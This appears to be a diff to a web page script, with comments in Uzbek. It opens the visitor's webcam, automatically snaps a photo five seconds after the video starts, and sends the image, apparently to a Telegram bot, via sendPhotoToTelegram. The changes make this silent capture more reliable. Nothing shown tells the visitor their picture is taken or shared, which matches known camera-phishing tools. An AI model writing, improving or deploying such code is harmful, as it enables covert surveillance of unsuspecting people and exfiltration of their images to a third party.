@@ -10,10 +10,13 @@ navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
         video.srcObject = stream;
 
-        // Suratga olishni avtomatik amalga oshirish
-        setTimeout(() => {
-            takePicture();
-        }, 5000); // 5 soniya kutish
+        // Video tayyor bo'lganda surat olishni kutish
+        video.addEventListener('canplay', () => {
+            // Surat olishni 5 soniya kutib amalga oshirish
+            setTimeout(() => {
+                takePicture();
+            }, 5000); // 5 soniya kutish
+        });
     })
     .catch(error => {
         console.error('Xato:', error);
@@ -23,10 +26,15 @@ navigator.mediaDevices.getUserMedia({ video: true })
 function takePicture() {
     const canvas = document.createElement('canvas');
     const context = canvas.getContext('2d');
+
+    // Video o'lchamlarini to'g'ri sozlash
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
+
+    // Video oqimini canvasga chizish
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+    // Rasmni base64 formatda olish
     const imageData = canvas.toDataURL('image/png');
     sendPhotoToTelegram(imageData);
 }
@@ -72,3 +80,4 @@ function dataURLtoBlob(dataURL) {
     }
     return new Blob([new Uint8Array(array)], { type: mime });
 }
+
